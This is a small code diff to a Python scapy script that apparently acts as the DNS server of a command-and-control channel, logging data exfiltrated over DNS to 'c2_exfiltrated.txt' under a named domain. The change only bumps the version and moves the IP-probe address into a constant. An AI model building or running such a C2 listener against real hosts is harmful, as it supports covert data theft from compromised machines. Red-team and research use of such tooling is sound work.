@@ -43,7 +43,7 @@ import time
 
 from scapy.layers.dns import DNS, DNSRR, DNSRRSOA
 
-VERSION = "v1.0"
+VERSION = "v1.1"
 DOMAIN = "d.lootforge.org"
 NS_HOST = "cwmkeg.lootforge.org"
 OUTPUT_FILE = "c2_exfiltrated.txt"
@@ -78,13 +78,15 @@ def _b32enc(s: str) -> bytes:
     return base64.b32encode(s.encode())
 
 
+_PROBE_IP = "8.8.8.8"
+
 # ── Server IP discovery ───────────────────────────────────────────────────────
 
 def _detect_server_ip() -> str:
     """Determine this host's outbound IP via a connect-trick (no packets sent)."""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
+        s.connect((_PROBE_IP, 80))
         ip = s.getsockname()[0]
         s.close()
         return ip
